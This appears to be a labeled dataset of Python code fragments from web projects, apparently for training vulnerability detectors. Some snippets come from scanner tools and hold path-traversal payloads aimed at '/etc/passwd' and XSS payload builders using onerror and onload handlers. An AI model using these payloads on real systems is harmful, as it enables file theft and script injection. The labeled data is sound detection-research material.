bundle_doc=Document2.objects.get(id=bundle_data['id']) else: bundle_doc=Document2.objects.create", "label": 0}, {"snippet_id": 10709, "code": " this is less than or equal to the number of available processors. verify_xss -when set, check for XSS vulnerabilities in the page HTML. See nosetest documentation: http://nose.readthedocs.org/en/latest", "label": 0}, {"snippet_id": 42228, "code": "\t\t\tif key not in self.__dict__: \t\t\t\tself.__dict__[key]=None \t\t\tif key in(\"idx\", \"docstatus\") and self.__dict__[key] is None: \t\t\t\tself.__dict__[key]=0 \t\tfor key in self.get_valid_columns(): \t\t\tif key not", "label": 0}, {"snippet_id": 37895, "code": ".content[:140] \t\t\tself.blog_intro=strip_html_tags(self.blog_intro) \t\tif self.blog_intro: \t\t\tself.blog_intro=self.blog_intro[:140] \t\tif self.published and not self.published_on: \t\t\tself.published_on=today() \t\t", "label": 0}, {"snippet_id": 42411, "code": "\tset_new_name(self) \t\tif not self.creation: \t\t\tself.creation=self.modified=now() \t\t\tself.created_by=self.modifield_by=frappe.session.user \t\td=self.get_valid_dict(convert_dates_to_str=True) \t\tcolumns=list(d) \t", "label": 0}, {"snippet_id": 45015, "code": "], param['value']) for param in parameters])) params_form=ParametersFormSet(initial=initial_params) popup=render('editor/submit_job_popup.mako', request,{ 'params_form': params_form, 'action': reverse(", "label": 0}, {"snippet_id": 5413, "code": "'ondurationchange', 'onend', 'onemptied', 'onended', 'onerror', 'onfocus', 'onfocusin', 'onfocusout', 'onhashchange', 'oninput', 'oninvalid', 'onkeydown', 'onkeypress', 'onkeyup', 'onload', 'onloadeddata', ", "label": 0}, {"snippet_id": 48960, "code": "=display_function() if display_function else field return escape(value) def format(self, value): if isinstance(value, datetime.datetime) or isinstance(value, datetime.date): return localize(value) return", "label": 1}, {"snippet_id": 28264, "code": " MASTERS: \t\tif master[0] !=None: \t\t\tfunct.upload_and_restart(master[0], cfg, just_save=save) \t\t \tstderr=funct.upload_and_restart(serv, cfg, just_save=save) \t\t \tfunct.diff_config(oldcfg, cfg) \t \t \t \t \t ", "label": 0}, {"snippet_id": 24853, "code": " This method composes the nosetests command to send to the terminal. If nosetests aren't being run, the command returns an empty string. \"\"\" if not self.test_spec: test_spec=self.test_dir else: test_spec", "label": 0}, {"snippet_id": 27433, "code": " return text.splitlines() def split_br(text): return re.split(r'\\s*<br */>\\s*', text, flags=re.IGNORECASE) def encode_json(value): \"\"\"Dump base64-encoded JSON string(to avoid XSS).\"\"\" return base64.b64encode", "label": 0}, {"snippet_id": 43674, "code": " get_default_df \t\t\tdf=get_default_df(fieldname) \t\tval=self.get(fieldname) \t\tif translated: \t\t\tval=_(val) \t\tif absolute_value and isinstance(val,(int, float)): \t\t\tval=abs(self.get(fieldname)) \t\tif not doc: \t\t", "label": 0}, {"snippet_id": 11177, "code": ".\\n\" break @property def cmd(self): \"\"\" This method composes the nosetests command to send to the terminal. If nosetests aren't being run, the command returns an empty string. \"\"\" if not self.test_spec", "label": 0}, {"snippet_id": 14587, "code": "{default_store} \" \"SCREENSHOT_DIR='{repo_dir}/test_root/log{shard_str}' \" \"BOK_CHOY_HAR_DIR='{repo_dir}/test_root/log{shard_str}/hars' \" \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{repo_dir}/{a11y_custom_file}' ", "label": 0}, {"snippet_id": 8441, "code": "\nfrom django.conf import settings from django.conf.urls import patterns, include, url from django.contrib import admin from django.conf.urls.static import static from. import one_time_startup import django", "label": 0}, {"snippet_id": 47002, "code": " if not cids: return[] queryset=await ReactItem.filter( Q(user_id=user_id), Q(target_id__in=cids), Q(target_kind=K_COMMENT)) return[item.target_id for item in queryset] @comment_reacted.connect async def", "label": 0}, {"snippet_id": 13066, "code": "'^admin_dashboard$', 'dashboard.views.dashboard'), url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"), url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change", "label": 0}, {"snippet_id": 8121, "code": "', name=\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P", "label": 0}, {"snippet_id": 30226, "code": " requests_toolbelt.utils import dump \t \thaproxy_user=sql.get_setting('stats_user') \thaproxy_pass=sql.get_setting('stats_password') \tstats_port=sql.get_setting('stats_port') \tstats_page=sql.get_setting('stats_page')", "label": 0}, {"snippet_id": 26289, "code": "=vat_moss.id.validate(data.get('vat_id')) if result: country_code, normalized_id, company_name=result self.instance.vat_id_validated=True self.instance.vat_id=normalized_id except(vat_moss.errors.InvalidError", "label": 0}, {"snippet_id": 30252, "code": "\t\t'b': form.getvalue('b') \t} \theaders={ \t\t'User-Agent': 'Mozilla/5.0(Windows NT 5.1; rv:20.0) Gecko/20100101 Firefox/20.0', \t\t'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'", "label": 0}, {"snippet_id": 33413, "code": " Scanner import re class Check(Scanner): \tdef gen_payload(self): \t\tfrom cores.xeger import Xeger \t\tgenerate=Xeger() \t\twhile True: \t\t\t_payload=generate.xeger(\"((\\%3C)|<)((\\%69)|i|(\\%49))((\\%6D)|m|(\\%4D))((\\", "label": 0}, {"snippet_id": 5171, "code": ">hi' def img(self, payload): return '<img/onerror=\"%s\"/src=x>' % payload def svg(self, payload): return '<svg/onload=\"%s\"/>' % payload def style(self, payload): return '<style/onload=\"%s\"></style>' % payload", "label": 0}, {"snippet_id": 1313, "code": "): vul_list=[] records=db.vulnerabilities.find({\"scanid\":scanid}) print \"Records are \",records if records: for data in records: print \"Data is\",data if data['req_body']==None: data['req_body']=\"NA\" data", "label": 0}, {"snippet_id": 16134, "code": "', 'track.views.user_track'), url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'), url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"), url(r'^login_ajax$', ", "label": 0}, {"snippet_id": 14336, "code": "'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'), url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login", "label": 0}, {"snippet_id": 14725, "code": "}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_spec_with_draft_default_store(self): spec='test_foo.py' suite=BokChoyTestSuite('', test_spec=spec, default_store=", "label": 0}, {"snippet_id": 28548, "code": " +\"/config_edit-\"+get_data('logs')+\".log\", \"a\") \ttry:\t \t\tlog.write(mess) \t\tlog.close \texcept IOError as e: \t\tprint('<center><div class=\"alert alert-danger\">Can\\'t write log. Please check log_path in config", "label": 0}, {"snippet_id": 15503, "code": ", color, and verbosity do not work well together. We need to construct the proper combination for use with nosetests. \"\"\" substring=[] if self.verbosity !=DEFAULT_VERBOSITY and self.num_processes !=DEFAULT_NUM_PROCESSES", "label": 0}, {"snippet_id": 45149, "code": "=Coordinator(document=doc) else: coordinator=Coordinator() api=get_oozie(request.user) credentials=Credentials() try: credentials.fetch(api) except Exception, e: LOG.error(smart_str(e)) workflows=[dict([(", "label": 0}, {"snippet_id": 25619, "code": ", label=_('Attendee name'), initial=(cartpos.attendee_name_parts if cartpos else orderpos.attendee_name_parts), ) if item.admission and event.settings.attendee_emails_asked: self.fields['attendee_email", "label": 0}, {"snippet_id": 35069, "code": "(convert_dates_to_str=True) \t\t \t\tname=d['name'] \t\tdel d['name'] \t\tcolumns=list(d) \t\ttry: \t\t\tfrappe.db.sql(\"\"\"update `tab{doctype}` \t\t\t\tset{values} where name=%s\"\"\".format( \t\t\t\t\tdoctype=self.doctype, \t\t\t", "label": 0}, {"snippet_id": 22573, "code": "'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns +=( url('^wiki/create", "label": 0}, {"snippet_id": 17066, "code": "\"cohorts\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$', 'course_groups.views.add_cohort', name=\"add_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$'", "label": 0}, {"snippet_id": 991, "code": " xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) return def xss_get_uri(url,method,headers,body,scanid=None): db_update='' vul_param='' url_query=urlparse.urlparse", "label": 1}, {"snippet_id": 21297, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/", "label": 1}, {"snippet_id": 48520, "code": " res def manipulate_reservation_action(request: HttpRequest, default_foreward_url: str): \"\"\" This function is used to alter the reservation beeing build inside a cookie. This function automatically crafts", "label": 0}, {"snippet_id": 23375, "code": "', name='openid-login'), url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'), url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),", "label": 0}, {"snippet_id": 31180, "code": "('metrics_waf'): \tsql.update_waf_metrics_enable(form.getvalue('metrics_waf'), form.getvalue('enable')) \t\t if form.getvalue('table_metrics'): \timport http.cookies \tfrom jinja2 import Environment, FileSystemLoader", "label": 0}, {"snippet_id": 33115, "code": " from legacy import swarmbucket_api import access import api import bq import bulkproc import config import expiration import model import notifications import service import swarming import user README_MD", "label": 0}, {"snippet_id": 39356, "code": " \t\t\t\t), list(d.values())) \t\texcept Exception as e: \t\t\tif e.args[0]==1062: \t\t\t\tif \"PRIMARY\" in cstr(e.args[1]): \t\t\t\t\tif self.meta.autoname==\"hash\": \t\t\t\t\t\t \t\t\t\t\t\tself.name=None \t\t\t\t\t\tself.db_insert() \t\t\t", "label": 0}, {"snippet_id": 28629, "code": " send message. Add Telegram chanel before use alerting at this servers group\") \t\tsys.exit() \t def check_login(**kwargs): \timport sql \timport http.cookies \tcookie=http.cookies.SimpleCookie(os.environ.get(", "label": 0}, {"snippet_id": 12108, "code": "+/[^/]+)/$', 'courseware.views.course_info', name=\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]", "label": 0}, {"snippet_id": 42715, "code": " self.parentfield: \t\t\t\treturn \"{}:{}{} \t\t\t\t\t_(\"Row\"), self.idx, _(\"Value missing for\"), _(df.label)) \t\t\telse: \t\t\t\treturn _(\"Error: Value missing for{0}:{1}\").format(_(df.parent), _(df.label)) \t\tmissing", "label": 0}, {"snippet_id": 6303, "code": ", 'syslog_debug') @property def listen_addr(self): \"\"\" IP address to listen on. \"\"\" return self.config.get(self.section, 'listen_addr') @property def listen_port(self): \"\"\" The port the IdP authentication", "label": 0}, {"snippet_id": 30709, "code": "%s\" |sudo socat stdio %s | cut -d \",\" -f 1-2,5-10,18,34-36 | column -s, -t' %(enable, backend, haproxy_sock) \t \tif form.getvalue('save')==\"on\": \t\tsave_command='echo \"show servers state\" | sudo socat stdio", "label": 0}, {"snippet_id": 35590, "code": "\t\t\t\tcontinue \t\t\t \t\t\tself.set(df.fieldname, cstr(self.get(df.fieldname)).strip()) \t\t\tvalue=self.get(df.fieldname) \t\t\tif value not in options and not(frappe.flags.in_test and value.startswith(\"_T-\")): \t\t", "label": 0}, {"snippet_id": 21799, "code": ">[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$', 'courseware.views.submission_history', name='submission_history'), ) if settings.ENABLE_JASMINE: urlpatterns +=(url", "label": 0}, {"snippet_id": 12163, "code": "<page>[^/]*)$', 'staticbook.views.index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$', 'staticbook.views.index_shifted'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^", "label": 1}, {"snippet_id": 25489, "code": ".require_all_fields=require_all_fields self.required=self.one_required def clean(self, value) -> dict: value=super().clean(value) if self.one_required and(not value or not any(v for v in value)): raise", "label": 0}, {"snippet_id": 162, "code": "\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) result=True uri_check_list=['?', '&', '=', '%3F', '%26', '%3D'] for uri_list in uri_check_list: if uri_list in url: parsed_url=urlparse", "label": 0}, {"snippet_id": 37264, "code": " validate(self): \t\tsuper(BlogPost, self).validate() \t\tif not self.blog_intro: \t\t\tself.blog_intro=self.content[:140] \t\t\tself.blog_intro=strip_html_tags(self.blog_intro) \t\tif self.blog_intro: \t\t\tself.blog_intro", "label": 0}, {"snippet_id": 43600, "code": "[cache_key]=frappe._dict() \t\tif fieldname not in self._precision[cache_key]: \t\t\tself._precision[cache_key][fieldname]=None \t\t\tdoctype=self.meta.get_field(parentfield).options if parentfield else self.doctype", "label": 0}, {"snippet_id": 9208, "code": ".pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^", "label": 1}, {"snippet_id": 49369, "code": " value, query_params): self.field_name=field_name self.label=label self.value=value self.query_params=query_params def get_title(self): return self.label def get_url(self): return self.get_url_with_query_params", "label": 0}, {"snippet_id": 16420, "code": ".render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url': '/static/images/favicon.ico'}), url(r'^submit_feedback$', 'util.views.submit_feedback'),", "label": 0}, {"snippet_id": 9453, "code": "[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$', 'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'), url(r'^courses/(?P<course_id>[^/]+/[^/", "label": 0}, {"snippet_id": 45632, "code": ".get(id=bundle_data['id']) else: bundle_doc=Document2.objects.create(name=bundle_data['name'], uuid=bundle_data['uuid'], type='oozie-bundle2', owner=request.user) Document.objects.link(bundle_doc, owner", "label": 0}, {"snippet_id": 47248, "code": ".uuid4()) Record.create({'title': 'test'}, id_=rec_uuid) db.session.commit() with app.test_request_context(): index_view_url=url_for('recordmetadata.index_view') delete_view_url=url_for('recordmetadata", "label": 1}, {"snippet_id": 26565, "code": "./../etc/passwd%00', '../../../../../../etc/passwd%00', '../../../../../../../etc/passwd%00', '../../../../../../../../etc/passwd%00', '%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc", "label": 0}, {"snippet_id": 13420, "code": "(): if value is None: continue if key==\"ROOT\" or key==\"COURSES\" or key==\"FAQ\": continue template=\"%s.html\" % key.lower() if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: template=\"theme-\" +template urlpatterns", "label": 0}, {"snippet_id": 52294, "code": " doc2.update_data({'workflow': workflow.get_data()['workflow']}) doc2.save() workflow.set_workspace(request.user) workflow.check_workspace(request.fs, request.user) response={} request.info(_('Workflows", "label": 0}, {"snippet_id": 48453, "code": " response=HttpResponseRedirect(forward_url +\"?rid=\" +str(current_reservation.id)) return response def write_db_reservation_action(request: HttpRequest): \"\"\" This function is used to submit the reservation \"", "label": 0}, {"snippet_id": 41777, "code": ")) \t\tfor key, value in iteritems(d): \t\t\t \t\t\tif(self.get(key) is None) and(value is not None) and(key not in self.dont_update_if_missing): \t\t\t\tself.set(key, value) \tdef get_db_value(self, key): \t\treturn", "label": 0}, {"snippet_id": 22995, "code": "/[^/]+)/progress/(?P<student_id>[^/]*)/$', 'courseware.views.progress', name=\"student_progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$', 'instructor.views.instructor_dashboard', name", "label": 0}, {"snippet_id": 13029, "code": ") urlpatterns=('', url(r'^update_certificate$', 'certificates.views.update_certificate'), url(r'^$', 'branding.views.index', name=\"root\"), url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard", "label": 0}, {"snippet_id": 20707, "code": "'student.views.accounts_login', name=\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user', name=\"login\"), url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'), url(r'^logout$', ", "label": 0}, {"snippet_id": 6129, "code": " if INI-file can't be parsed \"\"\" def __init__(self, filename, debug): self._parsed_content_packages=None self._parsed_status_test_usernames=None self.section=_CONFIG_SECTION _CONFIG_DEFAULTS['debug']=str", "label": 0}, {"snippet_id": 48123, "code": ", int(height)), PIL.Image.LANCZOS) cropped.save(low_res_file_name) m.text=text m.cachedText=compile_markdown(text) m.category=category m.highResFile=\"/\" +high_res_file_name m.lowResFile=\"/\" +low_res_file_name", "label": 1}, {"snippet_id": 26843, "code": " loader]', '/fastdetect', 'root:x:0:0', ':/root:/bin'] def check_xss(host, page, method, params, hidden_param_name, hidden_param_value, form_counter, _url): global xss_attacks global DEBUG if page.find", "label": 0}, {"snippet_id": 25630, "code": " item.admission and event.settings.attendee_emails_asked: self.fields['attendee_email']=forms.EmailField( required=event.settings.attendee_emails_required, label=_('Attendee email'), initial=(cartpos.attendee_email", "label": 0}, {"snippet_id": 31358, "code": " \t\t \t\toutput_file(\"templates/metrics_out.html\", mode='inline') \t\t \t\tx_min=df.index.min() -pd.Timedelta(hours=1) \t\tx_max=df.index.max() +pd.Timedelta(minutes=1) \t\tp[serv]=figure( \t\t\ttools=\"pan,box_zoom,reset", "label": 0}, {"snippet_id": 21779, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$', 'courseware.views.static_tab', name=\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url", "label": 0}, {"snippet_id": 22385, "code": "\"static_university_profile\", kwargs={'org_id': 'TorontoX'}), url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}), url(r'^", "label": 0}, {"snippet_id": 10990, "code": " \"--xunit-file={}\".format(self.xunit_report), \"--verbosity={}\".format(self.verbosity), ] return \" \".join(substring) def prepare_bokchoy_run(self): \"\"\" Sets up and starts servers for a Bok Choy run. If ", "label": 0}, {"snippet_id": 21354, "code": "'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]", "label": 1}, {"snippet_id": 47877, "code": " password for user: \" +user.displayName) au.set_password(pw1) else: logging.log(logging.INFO, \"Failed to set password for: \" +user.displayName) au.email=mail au.save() user.save() else: username=str(request", "label": 1}, {"snippet_id": 35628, "code": "\t\t\tfrappe.throw(_('{0}{1} cannot be \"{2}\". It should be one of \"{3}\"').format(prefix, label, \t\t\t\t\tvalue, comma_options)) \tdef _validate_constants(self): \t\tif frappe.flags.in_import or self.is_new() or self", "label": 0}, {"snippet_id": 11159, "code": " multiple times can corrupt noseid files and system state. Just press it once.\\n' while True: try: sleep(10000) except KeyboardInterrupt: print \"Stopping bok-choy servers.\\n\" break @property def cmd(self): \"", "label": 0}, {"snippet_id": 1837, "code": " if res_headers['Content-Type'].find('application/json') !=-1 or res_headers['Content-Type'].find('text/plain') !=-1: impact=\"Low\" else: impact=\"High\" else: impact=\"Low\" return impact def xss_payload_decode", "label": 0}, {"snippet_id": 40739, "code": " not in has_access_to and df.fieldtype not in display_fieldtypes: \t\t\t\tto_reset.append(df) \t\tif to_reset: \t\t\tif self.is_new(): \t\t\t\t \t\t\t\tref_doc=frappe.new_doc(self.doctype) \t\t\telse: \t\t\t\t \t\t\t\tif self.get", "label": 0}, {"snippet_id": 16579, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', ", "label": 0}, {"snippet_id": 35665, "code": ")})] \t\tif constants: \t\t\tvalues=frappe.db.get_value(self.doctype, self.name, constants, as_dict=True) \t\tfor fieldname in constants: \t\t\tdf=self.meta.get_field(fieldname) \t\t\t \t\t\tif df.fieldtype=='Date' or", "label": 0}, {"snippet_id": 39964, "code": "\tprefix=_(\"Row \t\t\t\tlabel=_(self.meta.get_label(df.fieldname)) \t\t\t\tcomma_options='\", \"'.join(_(each) for each in options) \t\t\t\tfrappe.throw(_('{0}{1} cannot be \"{2}\". It should be one of \"{3}\"').format(prefix", "label": 0}, {"snippet_id": 45436, "code": "'params_form': params_form, 'action': reverse('oozie:editor_submit_coordinator', kwargs={'doc_id': coordinator.id}) }, force_template=True).content return HttpResponse(json.dumps(popup), mimetype=\"application", "label": 0}, {"snippet_id": 18689, "code": "(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')), ) if settings.MITX_FEATURES.get", "label": 0}, {"snippet_id": 34731, "code": ").strip()==\"\": \t\t\t\t\t \t\t\t\t\td[fieldname]=None \t\t\t\tif isinstance(d[fieldname], list) and df.fieldtype !='Table': \t\t\t\t\tfrappe.throw(_('Value for{0} cannot be a list').format(_(df.label))) \t\t\t\tif convert_dates_to_str", "label": 0}, {"snippet_id": 13072, "code": ", name=\"change_email\"), url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'), url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"), url(r'^accept_name_change$", "label": 0}, {"snippet_id": 29665, "code": " def subprocess_execute(cmd): \timport subprocess \tp=subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, universal_newlines=True) \tstdout, stderr=p.communicate() \toutput=stdout", "label": 0}, {"snippet_id": 13983, "code": "'staff_grading_get_problem_list'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$', 'open_ended_grading.views.student_problem_list', name='open_ended_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+", "label": 0}, {"snippet_id": 6744, "code": " Base URL of the IdP. The default base URL is constructed from the Request URI, but for example if there is a load balancer/SSL terminator in front of the IdP it might be required to specify the URL of", "label": 0}, {"snippet_id": 44421, "code": ") if len(jobs) > 1 else _('Workflow deleted.')) return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_access_permission() def copy_workflow(request): if request.method ", "label": 0}, {"snippet_id": 50312, "code": "[csessid]=(time.time(), False) if not self.keep_alive: self.keep_alive=LoopingCall(self._keepalive) self.keep_alive.start(_KEEPALIVE, now=False) return jsonify({'msg': host_string, 'csessid': csessid}) def", "label": 0}, {"snippet_id": 32174, "code": ", verbose_name=_('Rules')) class Meta(object): name=\"idp_mappings\" verbose_name=_(\"Attribute Mappings\") row_actions=(EditMappingLink, DeleteMappingsAction) table_actions=(MappingFilterAction, CreateMappingLink", "label": 0}, {"snippet_id": 18077, "code": "(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$', 'courseware.views.jump_to', name=\"jump_to\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch", "label": 0}, {"snippet_id": 17825, "code": ", name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}), url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id", "label": 0}, {"snippet_id": 44435, "code": " @check_document_access_permission() def copy_workflow(request): if request.method !='POST': raise PopupException(_('A POST request is required.')) jobs=json.loads(request.POST.get('selection')) for job in jobs:", "label": 0}, {"snippet_id": 33380, "code": "'/internal/cron/buildbucket/bq-export-prod', bq.CronExportBuildsProd), webapp2.Route(r'/internal/cron/buildbucket/bq-export-experimental', bq.CronExportBuildsExperimental), webapp2.Route(r'/internal/cron", "label": 0}, {"snippet_id": 40768, "code": " in self.parent_doc.get(self.parentfield) if d.name==self.name][0] \t\t\t\telse: \t\t\t\t\tref_doc=self.get_latest() \t\t\tfor df in to_reset: \t\t\t\tself.set(df.fieldname, ref_doc.get(df.fieldname)) \tdef get_value(self", "label": 0}, {"snippet_id": 52117, "code": ".user) workflow_data=workflow.get_data() api=get_oozie(request.user) credentials=Credentials() try: credentials.fetch(api) except Exception, e: LOG.error(smart_str(e)) return render('editor/workflow_editor", "label": 0}, {"snippet_id": 47393, "code": ">Edit user \"' +profile.authuser.username +'\"</h3>')) f.add_content(PlainText('<a href=\"/admin/media/select?action_url=/admin/actions/change-user-avatar' '&payload=' +str(user_id) +'\"><img class=\"button-img", "label": 0}, {"snippet_id": 5197, "code": "(self, payload): return '<input/onfocus=\"%s\"/autofocus>' % payload def marquee(self, payload): return '<marquee/onstart=\"%s\"></marquee>' % payload def div(self, payload): return '<div/onwheel=\"%s\"/style=", "label": 0}, {"snippet_id": 38211, "code": " and published=1) \t\torder by title asc\"\"\", as_dict=1) def clear_blog_cache(): \tfor blog in frappe.db.sql_list(\"\"\"select route from \t\t`tabBlog Post` where ifnull(published,0)=1\"\"\"): \t\tclear_cache(blog) ", "label": 0}, {"snippet_id": 55169, "code": " action_status['latest_translation_pk']: Translation.objects.get( pk=action_status['latest_translation_pk'] ).update_latest_translation() update_translation_memory( action_status['changed_translation_pks", "label": 0}, {"snippet_id": 24793, "code": "\" \" common/test/db_fixtures/*.json\".format( default_store=self.default_store, ) ) def run_servers_continuously(self): \"\"\" Infinite loop. Servers will continue to run in the current session unless interrupted", "label": 0}, {"snippet_id": 25911, "code": "=help_text, initial=dateutil.parser.parse(initial.answer).astimezone(tz) if initial and initial.answer else None, widget=SplitDateTimePickerWidget(time_format=get_format_without_seconds('TIME_INPUT_FORMATS", "label": 0}, {"snippet_id": 40329, "code": "\t\t\t\tor(self.docstatus==1 and not df.get(\"allow_on_submit\"))): \t\t\t\tcontinue \t\t\telse: \t\t\t\tsanitized_value=sanitize_html(value, linkify=df.fieldtype=='Text Editor') \t\t\tself.set(fieldname, sanitized_value)", "label": 0}, {"snippet_id": 29965, "code": "-danger\">Can\\'t save ssh keys file. Check ssh keys path in config</div>') \telse: \t\tprint('<div class=\"alert alert-success\">Ssh key was save into: %s </div>' % ssh_keys) \ttry: \t\tfunct.logging(\"local\", \"users", "label": 0}, {"snippet_id": 49200, "code": ".replace(\"-\", \"\") if not int(c)==self.column_id: new_query.append(column) return self.get_url_with_query_params({ self.ordering_query_param: \".\".join(new_query) }) def get_reverse_sort_by(self): new_query=[]", "label": 0}, {"snippet_id": 32411, "code": "(representing a section title) to URL anchor name. This function is passed to \"toc\" extension as an extension option, so we can emulate the way how Gitiles converts header titles to URL anchors. Gitiles", "label": 0}, {"snippet_id": 20743, "code": "?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"), url(r'^create_exam_registration$', 'student.views.create_exam_registration'), url(r'^password_reset", "label": 0}, {"snippet_id": 38116, "code": "=category_title \telif frappe.local.form_dict.blogger: \t\tblogger=frappe.db.get_value(\"Blogger\",{\"name\": frappe.local.form_dict.blogger}, \"full_name\") \t\tlist_context.sub_title=_(\"Posts by{0}\").format(blogger) ", "label": 0}, {"snippet_id": 32704, "code": ") self._WriteTemplate('header.html') self.wfile.write('<div class=\"doc\">') self.wfile.write(md_fragment) self.wfile.write('</div>') self._WriteTemplate('footer.html') except: raise def _DoRawSourceFile", "label": 0}, {"snippet_id": 10999, "code": ".verbosity), ] return \" \".join(substring) def prepare_bokchoy_run(self): \"\"\" Sets up and starts servers for a Bok Choy run. If --fasttest is not specified then static assets are collected \"\"\" sh(\"{}/scripts", "label": 0}, {"snippet_id": 22141, "code": "'): admin.autodiscover() urlpatterns=('', url(r'^update_certificate$', 'certificates.views.update_certificate'), url(r'^$', 'branding.views.index', name=\"root\"), url(r'^dashboard$', 'student.views.dashboard", "label": 0}, {"snippet_id": 10773, "code": " self.testsonly=kwargs.get('testsonly', False) self.test_spec=kwargs.get('test_spec', None) self.default_store=kwargs.get('default_store', None) self.verbosity=kwargs.get('verbosity', DEFAULT_VERBOSITY)", "label": 0}, {"snippet_id": 20466, "code": "(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8003/auto_auth?{}\\\"\".format(lms_params)) def __enter__(self): if self.should_fetch_course: self.get_test_course() super(Pa11yCrawler, self)", "label": 0}, {"snippet_id": 23000, "code": ".progress', name=\"student_progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$', 'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"), url(r'^courses/(?P<course_id>[^", "label": 0}, {"snippet_id": 10291, "code": " expected_verbosity_string=( \"--with-xunit --xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml --verbosity=2\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '' ", "label": 0}, {"snippet_id": 16698, "code": " url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page", "label": 1}, {"snippet_id": 35800, "code": " max characters allowed is{2}\")\\ \t\t\t\t\t\t.format(reference, _(df.label), max_length, value), frappe.CharacterLengthExceededError, title=_('Value too big')) \tdef _validate_update_after_submit(self): \t\t \t\tdb_values", "label": 0}, {"snippet_id": 45017, "code": "'value']) for param in parameters])) params_form=ParametersFormSet(initial=initial_params) popup=render('editor/submit_job_popup.mako', request,{ 'params_form': params_form, 